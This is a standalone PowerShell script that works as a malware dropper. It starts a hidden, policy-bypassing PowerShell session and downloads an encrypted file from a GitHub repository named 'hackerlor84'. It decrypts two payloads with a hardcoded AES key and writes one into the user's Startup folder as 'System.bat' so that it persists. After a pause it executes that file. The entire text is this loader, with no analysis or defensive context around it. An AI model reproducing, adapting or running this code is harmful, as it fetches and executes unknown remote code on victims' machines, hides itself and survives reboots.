Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command "
$url = "https://github.com/hackerlor84/hackerlor84/raw/refs/heads/main/code.txt"
$outputFile1 = "C:\Users\Public\Windows.launch"
$outputFile2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\System.bat"
$key = [System.Text.Encoding]::UTF8.GetBytes("ThisIsA16ByteKey")
$iv = [System.Text.Encoding]::UTF8.GetBytes("16ByteInitVector")

$tempFilePath = "$env:TEMP\code.txt"
Invoke-WebRequest -Uri $url -OutFile $tempFilePath

$content = Get-Content -Path $tempFilePath -Raw
$parts = $content -split "===SPLIT==="

function Decrypt-File {
    param (
        [string]$encryptedData
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $encryptedBytes = [System.Convert]::FromBase64String($encryptedData)
    $decryptor = $aes.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    $decryptor.Dispose()
    $aes.Dispose()

    return $decryptedData
}

[System.IO.File]::WriteAllBytes($outputFile1, (Decrypt-File -encryptedData $parts[0]))
[System.IO.File]::WriteAllBytes($outputFile2, (Decrypt-File -encryptedData $parts[1]))

Start-Sleep -Seconds 20
Start-Process -FilePath $outputFile2
